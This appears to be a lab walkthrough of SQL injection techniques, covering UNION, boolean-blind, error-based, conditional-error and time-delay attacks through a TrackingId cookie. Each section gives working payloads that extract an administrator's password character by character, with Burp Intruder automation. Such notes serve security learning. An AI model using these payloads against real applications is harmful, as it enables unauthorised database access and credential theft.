# Retrieve multiple values in a single column

### Scenario
Trying to extract administrator's username and password from a table using a UNION injection and putting the two values in a single column.

### Exploit

We can abuse the string concatenation in SQL:

```sql
' UNION SELECT NULL, username || '<->' || password from users -- 
```

# Blind SQL injection with conditional responses

### Scenario

There is a SQL injection point in the "Cookie" request parameter. If the injection is correct we will obtain a "welcome back" messagge. 

### Exploit

With this SQL injection we can confirm the existence of the users table:

```sql
Cookie: TrackingId=ID' AND (SELECT 'a' FROM users LIMIT 1) = 'a'-- 
```
With the following one we can confirm the existence of the user "administrator":

```sql
Cookie: TrackingId=ID' AND (SELECT 'a' FROM users where username= 'administrator') = 'a'-- 
```

With the following one we can confirm the existence of the user "administrator" and try to find out the length of the associated password:

```sql
Cookie: TrackingId=ID' AND (SELECT 'a' FROM users where username= 'administrator' AND LENGTH(password) > 1) = 'a'-- 
```

**We can use Burp Intruder to increment automatically the value of the length in the request**.


Using Burp we found that the password length is exactly 20 chars.

We can use **"SUBSTRING()" SQL funciton** which extract part of a string contained in a DB. This takes three parameters: name of the column, starting point location in the string (with the starting point that is 1 and not 0), number of chars after the starting location.

We are trying to check if the first char of the password of admin user is equal to 'a':

```sql
Cookie: TrackingId=ID' AND (SELECT SUBSTRING(password, 1, 1) FROM users where username= 'administrator') = 'a'-- 
```

Another time, we can use Burp intruder to automate this check and than pass to the next chars.

# Visible error-based (not at all) BLIND SQL injection

### Scenario
We are in a situation in which we noticed that the there is a possible SQL injection in the "cookie" paramenter of the GET request.
We also noticed that if we force an error on the database, an error message is printed on the web pages, this is **a potential information leakege**. We want to exploit it to retrieve the administrator username and password from the table "users".

### Exploit
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users where username= 'administrator') AS INT) -- 
```

Or:
```sql
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) -- 
```


# BLIND SQL, injection with conditional errors

### Scenario
We are in a situation in which no "welcome back" messages are returned if we do the right SQL injection in the Cookie vulnerable field.
Althought, we noticed that if we send the following injection, we obtain an "Internal Server Error" message:

```sql
Cookie: TrackingId=SOME_ID'
```

We now know that the parameter is vulnerable to SQL injection. We want to manioulate this error message in order to extract informations from DB.

### Exploit

We can try something like this:
```sql
Cookie: TrackingId=abc' AND 1=1 --
```

We noticed that we don't get any errors.

We can try using the **CASE() function**:
```sql
Cookie: TrackingId=abc' AND (SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' --
```
This not return an error because 1 is always different from 2, so the impossible operation 1/0 is never done.

If we change the query as the following we get an error:
```sql
Cookie: TrackingId=abc' AND (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' --
```

We can try to catch the password length qith a query like this:
```sql
Cookie: TrackingId=abc' AND (SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a' --
```
We get an error message because password is larger than 1 and so the impossible operation 1/0 is done.

**We can use Burp intruder increasing the length value until we don't get an error anymore**.

We will found that password is exactly 20 chars.

We can now try to brute force every single char of the password:
```sql
Cookie: TrackingId=abc' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) ='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a' --
```

Another time, we can use the Intruder to automate the reasearch of every char.

# Blind SQL, time delays

### Scenario

We identify a SQL injection inside the "cookie" parameter of the GET request. The bakcend DB is a PosgreSQL. So we need to use the sleep function ps_sleep(seconds) and we can trigger the execution of this function using the concatenation ||.

### Exploit

We can exploit this vulnerability using:
```sql
x' || pg_sleep(10)-- 
```

So in this case, we get the flag but this exploit do nothing interesting.


We need to retrieve informations from the exploit.

```sql
x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

With the above SQL injection string we can force the DB to sleep or not. If the sleep is triggered we know that the username administrator exists in the users table.

We can, also, try to find out the length of the passsword of the administrator account:


```sql
x';SELECT CASE WHEN (username='administrator' AND LENGHT(password) > 1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**Using Intruder we can automate the research**.

We can, also, brute force the password using the SUBSTRING method:

```sql
x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Another time, using Intruder we can automate the research of the password's chars.
